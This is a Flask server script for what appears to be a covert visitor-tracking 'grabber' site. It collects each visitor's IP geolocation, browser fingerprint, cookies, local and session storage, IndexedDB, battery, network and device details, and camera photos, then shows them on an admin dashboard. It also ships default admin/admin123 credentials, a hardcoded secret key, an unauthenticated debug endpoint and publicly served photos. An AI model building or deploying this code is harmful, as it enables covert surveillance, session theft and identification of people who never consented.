from flask import Flask, request, jsonify, render_template, session, redirect, url_for
from flask_cors import CORS
from datetime import datetime
import sqlite3
import hashlib
import json
import os
import requests
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'ed09a8f63982882c3ce5bb2897d1d9d3')
CORS(app)

# Database setup
DB_PATH = 'user_data.db'

# Photo storage setup
PHOTOS_FOLDER = 'captured_photos'
if not os.path.exists(PHOTOS_FOLDER):
    os.makedirs(PHOTOS_FOLDER)
    print(f"Created photos folder: {PHOTOS_FOLDER}")

ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif'}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def init_db():
    """Initialize the database with required tables"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # Table to store collected user data
    c.execute('''CREATE TABLE IF NOT EXISTS collected_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT NOT NULL,
        ip_address TEXT,
        user_agent TEXT,
        device_info TEXT,
        fingerprint TEXT,
        location_data TEXT,
        storage_info TEXT,
        connection_info TEXT,
        vpn_detection TEXT,
        battery_info TEXT,
        network_info TEXT,
        media_devices TEXT,
        camera_permission TEXT,
        raw_data TEXT
    )''')

    # Migrate existing database: Add new columns if they don't exist
    try:
        # Check if new columns exist
        c.execute("PRAGMA table_info(collected_data)")
        columns = [col[1] for col in c.fetchall()]

        # Add missing columns
        if 'battery_info' not in columns:
            c.execute('ALTER TABLE collected_data ADD COLUMN battery_info TEXT')
            print("Added battery_info column")

        if 'network_info' not in columns:
            c.execute('ALTER TABLE collected_data ADD COLUMN network_info TEXT')
            print("Added network_info column")

        if 'media_devices' not in columns:
            c.execute('ALTER TABLE collected_data ADD COLUMN media_devices TEXT')
            print("Added media_devices column")

        if 'camera_permission' not in columns:
            c.execute('ALTER TABLE collected_data ADD COLUMN camera_permission TEXT')
            print("Added camera_permission column")

    except Exception as e:
        print(f"Migration note: {e}")

    # Admin credentials table (username: admin, password: admin123 - CHANGE THIS!)
    c.execute('''CREATE TABLE IF NOT EXISTS admin_users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL
    )''')

    # Check if admin exists, if not create default admin
    c.execute('SELECT * FROM admin_users WHERE username = ?', ('admin',))
    if not c.fetchone():
        # Default password: admin123 (CHANGE THIS!)
        password_hash = hashlib.sha256('admin123'.encode()).hexdigest()
        c.execute('INSERT INTO admin_users (username, password_hash) VALUES (?, ?)',
                  ('admin', password_hash))

    # Photos table to store captured photos metadata
    c.execute('''CREATE TABLE IF NOT EXISTS captured_photos (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT NOT NULL,
        filename TEXT NOT NULL,
        filepath TEXT NOT NULL,
        ip_address TEXT,
        user_agent TEXT,
        file_size INTEGER,
        fingerprint TEXT,
        data_entry_id INTEGER
    )''')

    # Migrate existing photos table
    try:
        c.execute("PRAGMA table_info(captured_photos)")
        photo_columns = [col[1] for col in c.fetchall()]

        if 'fingerprint' not in photo_columns:
            c.execute('ALTER TABLE captured_photos ADD COLUMN fingerprint TEXT')
            print("Added fingerprint column to captured_photos")

        if 'data_entry_id' not in photo_columns:
            c.execute('ALTER TABLE captured_photos ADD COLUMN data_entry_id INTEGER')
            print("Added data_entry_id column to captured_photos")
    except Exception as e:
        print(f"Photo table migration note: {e}")

    conn.commit()
    conn.close()

# Initialize database on startup
init_db()

@app.route('/')
def index():
    """Serve the main page with the button"""
    return render_template('index.html')

@app.route('/api/get-ip-info')
def get_ip_info():
    """Backend endpoint to fetch IP info (avoids CORS issues)"""
    try:
        # Get client IP from headers (for when behind proxy/load balancer)
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        # If it's localhost, the IP info services will auto-detect the server's public IP
        # This is expected behavior when testing locally

        # Try multiple IP info providers
        # These services will return info based on the server's public IP when called from localhost
        providers = [
            'https://ipapi.co/json/',
            'https://ipwhois.app/json/',
            'https://ipinfo.io/json',
            'https://api.ipify.org?format=json'  # Fallback to get at least the IP
        ]

        for provider_url in providers:
            try:
                response = requests.get(provider_url, timeout=5)
                if response.ok:
                    data = response.json()

                    # If we only got IP (from ipify), try to enrich it with another provider
                    if 'ip' in data and len(data) == 1:
                        ip_to_lookup = data['ip']
                        # Try to get more info about this IP
                        try:
                            enriched = requests.get(f'https://ipapi.co/{ip_to_lookup}/json/', timeout=5)
                            if enriched.ok:
                                data = enriched.json()
                                data['provider'] = 'ipapi.co'
                        except:
                            pass

                    data['provider'] = data.get('provider', provider_url)
                    data['client_ip_from_request'] = client_ip
                    return jsonify(data), 200
            except Exception as e:
                print(f"Provider {provider_url} failed: {e}")
                continue

        # Fallback: just return the client IP
        return jsonify({'ip': client_ip, 'provider': 'fallback', 'note': 'Limited info - IP from request headers'}), 200

    except Exception as e:
        print(f"Error fetching IP info: {e}")
        return jsonify({'ip': request.remote_addr, 'error': str(e)}), 200

@app.route('/api/collect', methods=['POST'])
def collect_data():
    """API endpoint to receive data from frontend"""
    try:
        data = request.json
        timestamp = datetime.now().isoformat()

        # Get client IP - prefer the IP from geolocation service (more accurate for public IP)
        # Fall back to request headers if not available
        ip_from_geo = data.get('ipInfo', {}).get('ip')
        ip_from_request = request.headers.get('X-Forwarded-For', request.remote_addr)
        ip_address = ip_from_geo if ip_from_geo else ip_from_request

        # Extract data from the payload
        device_info = json.dumps(data.get('deviceInfo', {}))
        fingerprint = data.get('fingerprint', {}).get('fp', '')
        location_data = json.dumps(data.get('ipInfo', {}))
        storage_info = json.dumps({
            'cookies': data.get('cookies', []),
            'localStorage': data.get('localStorage', {}),
            'sessionStorage': data.get('sessionStorage', {}),
            'indexedDB': data.get('indexedDB', {})
        })
        connection_info = json.dumps(data.get('connectionInfo', {}))
        vpn_detection = json.dumps(data.get('vpnDetection', {}))
        battery_info = json.dumps(data.get('batteryInfo', {}))
        network_info = json.dumps(data.get('networkInfo', {}))
        media_devices = json.dumps(data.get('mediaDevices', {}))
        camera_permission = json.dumps(data.get('cameraAccess', {}))
        user_agent = request.headers.get('User-Agent', '')
        raw_data = json.dumps(data)

        # Enhanced logging for camera permission
        camera_data = data.get('cameraAccess', {})
        print(f"\n{'='*60}")
        print(f"[DATA COLLECTION] New entry at {timestamp}")
        print(f"IP Address: {ip_address}")
        print(f"Camera Permission Data: {camera_data}")
        print(f"Camera Granted: {camera_data.get('granted', 'NOT SET')}")
        print(f"Camera Message: {camera_data.get('message', 'NO MESSAGE')}")
        if camera_data.get('error'):
            print(f"Camera Error: {camera_data.get('error')}")
        print(f"{'='*60}\n")

        # Store in database
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''INSERT INTO collected_data
                     (timestamp, ip_address, user_agent, device_info, fingerprint,
                      location_data, storage_info, connection_info, vpn_detection,
                      battery_info, network_info, media_devices, camera_permission, raw_data)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (timestamp, ip_address, user_agent, device_info, fingerprint,
                   location_data, storage_info, connection_info, vpn_detection,
                   battery_info, network_info, media_devices, camera_permission, raw_data))
        conn.commit()
        conn.close()

        return jsonify({'status': 'success', 'message': 'Data collected successfully'}), 200

    except Exception as e:
        print(f"Error collecting data: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    """Admin login page"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        password_hash = hashlib.sha256(password.encode()).hexdigest()

        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT * FROM admin_users WHERE username = ? AND password_hash = ?',
                  (username, password_hash))
        user = c.fetchone()
        conn.close()

        if user:
            session['admin_logged_in'] = True
            session['username'] = username
            return redirect(url_for('admin_dashboard'))
        else:
            return render_template('login.html', error='Invalid credentials')

    return render_template('login.html')

@app.route('/admin/logout')
def admin_logout():
    """Admin logout"""
    session.clear()
    return redirect(url_for('admin_login'))

@app.route('/admin/dashboard')
def admin_dashboard():
    """Admin dashboard to view all collected data"""
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM collected_data ORDER BY timestamp DESC')
    rows = c.fetchall()

    # Convert rows to list of dictionaries
    data = []
    for row in rows:
        entry_id = row[0]
        fingerprint = row[5]

        # Find associated photo for this entry
        photo_filename = None
        c2 = conn.cursor()
        c2.execute('''SELECT filename FROM captured_photos
                     WHERE fingerprint = ? OR data_entry_id = ?
                     ORDER BY timestamp DESC LIMIT 1''', (fingerprint, entry_id))
        photo_row = c2.fetchone()
        if photo_row:
            photo_filename = photo_row[0]

        data.append({
            'id': entry_id,
            'timestamp': row[1],
            'ip_address': row[2],
            'user_agent': row[3],
            'device_info': json.loads(row[4]) if row[4] else {},
            'fingerprint': fingerprint,
            'location_data': json.loads(row[6]) if row[6] else {},
            'storage_info': json.loads(row[7]) if row[7] else {},
            'connection_info': json.loads(row[8]) if row[8] else {},
            'vpn_detection': json.loads(row[9]) if row[9] else {},
            'raw_data': row[10],
            'battery_info': json.loads(row[11]) if row[11] else {},
            'network_info': json.loads(row[12]) if row[12] else {},
            'media_devices': json.loads(row[13]) if row[13] else {},
            'camera_permission': json.loads(row[14]) if row[14] else {},
            'profile_photo': photo_filename  # Add profile photo
        })

    conn.close()
    return render_template('dashboard.html', data=data, count=len(data))

@app.route('/admin/api/data')
def admin_api_data():
    """API endpoint for admin to get all data as JSON"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM collected_data ORDER BY timestamp DESC')
    rows = c.fetchall()
    conn.close()

    data = []
    for row in rows:
        data.append({
            'id': row[0],
            'timestamp': row[1],
            'ip_address': row[2],
            'user_agent': row[3],
            'device_info': json.loads(row[4]) if row[4] else {},
            'fingerprint': row[5],
            'location_data': json.loads(row[6]) if row[6] else {},
            'storage_info': json.loads(row[7]) if row[7] else {},
            'connection_info': json.loads(row[8]) if row[8] else {},
            'vpn_detection': json.loads(row[9]) if row[9] else {},
            'battery_info': json.loads(row[11]) if row[11] else {},
            'network_info': json.loads(row[12]) if row[12] else {},
            'media_devices': json.loads(row[13]) if row[13] else {},
            'camera_permission': json.loads(row[14]) if row[14] else {}
        })

    return jsonify(data)

@app.route('/admin/api/delete/<int:id>', methods=['DELETE'])
def delete_entry(id):
    """Delete a specific entry"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('DELETE FROM collected_data WHERE id = ?', (id,))
    conn.commit()
    conn.close()

    return jsonify({'status': 'success', 'message': 'Entry deleted'})

@app.route('/admin/api/clear-all', methods=['DELETE'])
def clear_all_data():
    """Clear all collected data"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('DELETE FROM collected_data')
        conn.commit()
        deleted_count = c.rowcount
        conn.close()

        print(f"\n[ADMIN ACTION] All data cleared. Deleted {deleted_count} entries.\n")
        return jsonify({'status': 'success', 'message': f'All data cleared. Deleted {deleted_count} entries.'}), 200
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/admin/api/reset-database', methods=['DELETE'])
def reset_database():
    """Reset entire database - delete all data, photos, and photo files"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()

        # Count entries before deletion
        c.execute('SELECT COUNT(*) FROM collected_data')
        data_count = c.fetchone()[0]

        c.execute('SELECT COUNT(*) FROM captured_photos')
        photo_count = c.fetchone()[0]

        # Get all photo filenames to delete files
        c.execute('SELECT filepath FROM captured_photos')
        photo_files = c.fetchall()

        # Delete all data from tables
        c.execute('DELETE FROM collected_data')
        c.execute('DELETE FROM captured_photos')

        # Reset auto-increment counters by deleting from sqlite_sequence
        c.execute("DELETE FROM sqlite_sequence WHERE name='collected_data'")
        c.execute("DELETE FROM sqlite_sequence WHERE name='captured_photos'")

        conn.commit()
        conn.close()

        # Delete photo files from disk
        deleted_files = 0
        for photo_file in photo_files:
            filepath = photo_file[0]
            try:
                if os.path.exists(filepath):
                    os.remove(filepath)
                    deleted_files += 1
            except Exception as e:
                print(f"Warning: Could not delete file {filepath}: {e}")

        print(f"\n{'='*60}")
        print(f"[ADMIN ACTION] DATABASE RESET")
        print(f"Deleted {data_count} data entries")
        print(f"Deleted {photo_count} photo records")
        print(f"Deleted {deleted_files} photo files from disk")
        print(f"Auto-increment counters reset to 1")
        print(f"{'='*60}\n")

        return jsonify({
            'status': 'success',
            'message': f'Database reset complete. Deleted {data_count} data entries, {photo_count} photos, and {deleted_files} files. IDs will start from 1.',
            'data_count': data_count,
            'photo_count': photo_count,
            'files_deleted': deleted_files
        }), 200
    except Exception as e:
        print(f"Error resetting database: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/debug/last-entry')
def debug_last_entry():
    """Debug endpoint to view the last collected entry"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM collected_data ORDER BY id DESC LIMIT 1')
    row = c.fetchone()
    conn.close()

    if not row:
        return jsonify({'message': 'No data collected yet'}), 404

    entry = {
        'id': row[0],
        'timestamp': row[1],
        'ip_address': row[2],
        'user_agent': row[3],
        'device_info': json.loads(row[4]) if row[4] else {},
        'fingerprint': row[5],
        'location_data': json.loads(row[6]) if row[6] else {},
        'storage_info': json.loads(row[7]) if row[7] else {},
        'connection_info': json.loads(row[8]) if row[8] else {},
        'vpn_detection': json.loads(row[9]) if row[9] else {},
        'raw_data_preview': (row[10] or '')[:500] + '...' if row[10] and len(row[10]) > 500 else row[10],
        'battery_info': json.loads(row[11]) if row[11] else {},
        'network_info': json.loads(row[12]) if row[12] else {},
        'media_devices': json.loads(row[13]) if row[13] else {},
        'camera_permission': json.loads(row[14]) if row[14] else {}
    }

    return jsonify(entry), 200

@app.route('/api/save-photo', methods=['POST'])
def save_photo():
    """API endpoint to save captured photos"""
    try:
        if 'photo' not in request.files:
            return jsonify({'status': 'error', 'message': 'No photo file provided'}), 400

        photo = request.files['photo']
        timestamp_str = request.form.get('timestamp', datetime.now().isoformat())
        fingerprint = request.form.get('fingerprint', '')
        photo_ip = request.form.get('ip_address', '')

        if photo.filename == '':
            return jsonify({'status': 'error', 'message': 'No file selected'}), 400

        # Generate unique filename
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if not photo_ip:
            photo_ip = client_ip
        safe_ip = client_ip.replace('.', '_').replace(':', '_')
        filename = f'photo_{timestamp}_{safe_ip}.jpg'
        filepath = os.path.join(PHOTOS_FOLDER, filename)

        # Save the photo
        photo.save(filepath)
        file_size = os.path.getsize(filepath)

        # Get client info
        user_agent = request.headers.get('User-Agent', '')

        # Try to find matching data entry by fingerprint
        data_entry_id = None
        if fingerprint:
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute('SELECT id FROM collected_data WHERE fingerprint = ? ORDER BY timestamp DESC LIMIT 1', (fingerprint,))
            result = c.fetchone()
            if result:
                data_entry_id = result[0]
            conn.close()

        # Store metadata in database
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''INSERT INTO captured_photos
                     (timestamp, filename, filepath, ip_address, user_agent, file_size, fingerprint, data_entry_id)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                  (timestamp_str, filename, filepath, client_ip, user_agent, file_size, fingerprint, data_entry_id))
        photo_id = c.lastrowid
        conn.commit()
        conn.close()

        # Enhanced logging
        print(f"\n{'='*60}")
        print(f"[PHOTO CAPTURED]")
        print(f"Photo ID: {photo_id}")
        print(f"Timestamp: {timestamp_str}")
        print(f"Filename: {filename}")
        print(f"File Size: {file_size} bytes")
        print(f"IP Address: {client_ip}")
        print(f"Fingerprint: {fingerprint[:16]}..." if fingerprint else "N/A")
        print(f"Linked to Data Entry: {data_entry_id}" if data_entry_id else "Not linked")
        print(f"Saved to: {filepath}")
        print(f"{'='*60}\n")

        return jsonify({
            'status': 'success',
            'message': 'Photo saved successfully',
            'photo_id': photo_id,
            'filename': filename,
            'file_size': file_size,
            'data_entry_id': data_entry_id
        }), 200

    except Exception as e:
        print(f"Error saving photo: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/admin/photos')
def admin_photos():
    """Admin page to view all captured photos"""
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM captured_photos ORDER BY timestamp DESC')
    rows = c.fetchall()
    conn.close()

    photos = []
    for row in rows:
        photos.append({
            'id': row[0],
            'timestamp': row[1],
            'filename': row[2],
            'filepath': row[3],
            'ip_address': row[4],
            'user_agent': row[5],
            'file_size': row[6]
        })

    return render_template('photos.html', photos=photos, count=len(photos))

@app.route('/captured_photos/<filename>')
def serve_photo(filename):
    """Serve captured photo files"""
    from flask import send_from_directory
    return send_from_directory(PHOTOS_FOLDER, filename)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)